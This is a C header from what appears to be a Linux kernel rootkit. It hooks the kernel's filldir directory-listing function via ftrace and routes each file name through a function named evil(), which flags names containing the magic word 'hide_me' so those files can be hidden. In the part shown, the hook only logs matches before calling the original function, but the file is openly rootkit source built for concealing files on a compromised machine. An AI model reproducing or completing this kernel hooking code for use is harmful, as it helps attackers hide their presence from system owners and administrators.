#pragma once

#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>

#include "stdlib.h"
#include "rootkit.h"
#include "ftrace_helper.h"


char* MAGIC_WORD = "hide_me";


/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
*/
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};


void evil(const char* name) {    
    rk_info("Looking at: %s\n", name);
    if(strstr(name, MAGIC_WORD)){
        rk_info("Found file to hide: %s\n", name);
    }
}

static asmlinkage bool (*orig_filldir)(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type);

static asmlinkage bool hook_filldir(struct dir_context *ctx, const char *name, int namlen,
		   loff_t offset, u64 ino, unsigned int d_type) {
    evil(name);
    return orig_filldir(ctx, name, namlen, offset, ino, d_type);
}

static struct ftrace_hook syscall_hooks[] = {
    HOOK_NOSYS("filldir", hook_filldir, &orig_filldir),
};
